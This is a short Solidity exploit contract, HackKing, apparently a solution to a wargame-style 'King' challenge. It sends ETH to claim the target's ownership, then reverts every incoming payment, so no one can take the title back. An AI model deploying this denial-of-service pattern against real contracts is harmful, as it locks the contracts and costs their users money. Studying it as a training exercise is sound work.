// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {King} from "./King.sol";

contract HackKing {
    King king;

    constructor(King _king) {
        king = _king;
    }

    function getOwner() external payable {
        (bool suc, ) = address(king).call{value: msg.value}("");
        require(suc, "transaction failed");
    }

    receive() external payable {
        revert("contract destroyed");
    }
}
